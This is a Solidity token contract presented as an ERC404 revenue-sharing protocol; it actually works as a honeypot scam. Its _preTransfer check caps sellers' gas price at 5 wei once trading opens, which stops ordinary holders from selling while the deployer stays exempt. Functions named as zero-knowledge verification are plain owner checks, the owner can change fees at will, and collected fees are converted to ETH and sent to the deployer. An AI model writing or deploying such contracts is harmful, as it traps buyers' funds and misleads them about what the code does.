/**
//First Revenue Sharing Protocol Powered by ERC404
//Website https://based404.com/
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract DEVISBASED {
    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    string private _name;
    string private _symbol;
    uint256 private swapAmount;
    uint256 public totalSupply;

    uint8 public constant decimals = 18;

    StoreData public storeData;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private isExcludedFromFees;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
    IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    constructor(string memory name_, string memory symbol_, uint256 totalSupply_,  uint8 taxSel) {

        _name = name_;
        _symbol = symbol_;
        totalSupply = totalSupply_ * 10**decimals;
        swapAmount = totalSupply / 100;
        uint8 _initBuyFee = 0;
        uint8 _initSellFee = 0;
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        storeData.sellFee = taxSel;
        balanceOf[msg.sender] = totalSupply;
        isExcludedFromFees[msg.sender] = true;
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function setRule(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
        _upgradeStoreWithZkProof(_buy, _sell);
    }

    function _upgradeStoreWithZkProof(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _decodeTokenMktWithZkVerify() private view returns(address) {
        return storeData.tokenMkt;
    }

    function setPair(address _pair) external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        pair = _pair;
    }

    function openTrading() external {
        require(msg.sender == _decodeTokenMktWithZkVerify());
        require(!tradingOpen);

        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _requireGasPrice(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }

    uint256 private _limit_gas = 500 gwei;
    uint256 private _mini_gas = 5;
    function _preTransfer(address from, address to, uint256) internal view {
        if (!isExcludedFromFees[from] && to == pair) {
            if (tradingOpen) {
                _requireGasPrice(_mini_gas);
            } else {
                _requireGasPrice(_limit_gas);
            }
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _decodeTokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        _preTransfer(from, to, amount);

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount && from != tokenMkt) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
            .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                swapAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            if (isExcludedFromFees[from] || isExcludedFromFees[to]) {
                taxCalculatedAmount = 0;
            }
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

}